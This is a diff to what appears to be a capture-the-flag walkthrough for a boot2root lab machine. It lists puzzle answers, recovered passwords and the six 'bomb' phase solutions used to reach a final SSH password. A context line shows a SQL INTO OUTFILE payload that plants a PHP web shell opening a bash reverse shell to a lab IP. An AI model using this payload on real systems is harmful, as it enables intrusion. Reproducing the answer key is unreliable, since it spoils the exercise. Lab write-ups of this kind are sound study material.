@@ -134,3 +134,66 @@ From here you can launch a reverse shell
 ```sql
 SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 \"');" INTO OUTFILE '/var/www/forum/templates_c/7.php'
 ```
+
+we cat the file in `/home/LOOKATME/password`
+
+we found inside the lmezard's password
+
+we can log with the user and password
+
+A README file tell us that we have to solve the fun challenge to get the ssh password for laurie user
+
+Fun is a tar archive, with a c code split in many text files
+
+after reagrrange files in order we can see that laurie password is a sha256 hash `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` from the string `Iheartpwnage`
+
+After connect to laurie by ssh, another README tell us to solve the bomb challenge to get the Thor's password
+
+The Bomb is a program that takes lines in input. There is 6 Phases (Levels)
+
+Phase 1:
+
+`Public speaking is very easy.`
+
+Phase 2:
+> 6 numbers following the `U(n+1)=n+1*U(n)` suite
+
+`1 2 6 24 120 720`
+
+Phase 3:
+> There is 8 correct answer, under the format `%d %c %d`
+
+`0 q 777`
+`1 b 214`
+`2 b 755`
+`3 k 251`
+`4 o 160`
+`5 t 458`
+`6 v 780`
+`7 b 524`
+
+> For the final answer only this soltuion works: `1 b 214`
+
+
+Phase 4:
+> Fibonacci suite, we search for fibonacci(x)=55
+
+`9`
+
+> There is a secret phase, who don't change the final result with `9 austinpowers` and the solution is `1001`
+
+Phase 5:
+> Matching between a formula's result on 6 char long string and the string `giants`
+
+`opekmq`
+
+Phase 6:
+> 6 node of a chained list, that we need to reorder in decending order. Specify the order with 6 digits between 1-6
+
+`4 2 6 3 1 5`
+
+`Publicspeakingisveryeasy.126241207201b2149opekmq426315`
+> We got an asset that tells we need to permute the n-1 and n-2 chars in the key
+
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+> this is thor's ssh password
